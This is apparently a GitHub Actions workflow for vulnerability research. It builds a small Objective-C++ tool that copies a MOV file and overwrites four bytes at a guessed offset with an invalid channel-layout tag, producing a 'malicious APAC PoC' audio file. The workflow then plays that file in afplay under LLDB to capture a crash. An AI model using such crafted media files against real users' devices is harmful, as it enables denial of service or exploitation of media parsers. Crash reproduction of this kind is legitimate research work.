name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest2/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l

      # Updated: This script now only corrupts a pre-existing valid APAC file.
      - name: Patch encodeme.mm to Corrupt a Pre-existing APAC File
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to corrupt a pre-existing APAC file..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #import <AudioToolbox/AudioToolbox.h>
          #include <stdlib.h>
          #include <string.h>

          int main(int argc, const char * argv[]) {
              @autoreleasepool {
                  time_t startTime = time(NULL);
                  fprintf(stderr, "Starting file corruption at %s", ctime(&startTime));

                  // Use the MOV file provided by the user.
                  const char* baseName = "IMG_1027.mov";
                  const char* pocName = "output_apac_poc.m4a";

                  // Step 1: Assume the base file exists in the repository.
                  // Copy it to our target PoC file name.
                  NSError *error = nil;
                  if (![[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:baseName]
                                                               toPath:[NSString stringWithUTF8String:pocName] error:&error]) {
                      fprintf(stderr, "Failed to copy base file. Make sure '%s' exists in the repo. Error: %s\n", baseName, [[error localizedDescription] UTF8String]);
                      return 1;
                  }
                  fprintf(stderr, "Successfully copied base APAC file.\n");


                  // Step 2: Manually corrupt the channel layout in the new file.
                  FILE *file = fopen(pocName, "r+b");
                  if (!file) {
                      fprintf(stderr, "Failed to re-open the copied file for corruption.\n");
                      return 1;
                  }
                  
                  // This is the specific exploit: corrupt the layout tag.
                  // The offset is an estimate and may need to be adjusted depending on the base file's structure.
                  fseek(file, 0x110, SEEK_SET); 
                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF}; // Invalid layout tag
                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
                  fclose(file);

                  fprintf(stderr, "PoC: Manually corrupted the channel layout in the APAC file.\n");
                  time_t endTime = time(NULL);
                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
              }
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile the corruption utility
      - name: Compile encodeme.mm for Debugging
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm utility..."
          clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_corruptor
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # This step now just runs the corruption utility.
      - name: Corrupt APAC File
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          # This command will fail if you haven't added the MOV file to your repository.
          ./encodeme_corruptor
          echo "Malicious APAC PoC file generated."
          ls -l output_apac_poc.m4a
          
      # Launch the player directly under LLDB to catch any startup crashes.
      - name: Launch Player Under LLDB to Catch Crash
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Audio Player (afplay) with final PoC ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor afplay..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will automatically stop if a crash occurs.
          run
          # If a crash occurred, this will give us the full backtrace.
          bt
          quit
          EOF

          echo "Launching afplay under LLDB..." >> $PLAYER_LOG_FILE
          lldb -s player_debug_script.lldb -- afplay output_apac_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true

          echo "âœ… Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: debug-and-poc-artifacts
          path: |
            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
          retention-days: 7
          if-no-files-found: error
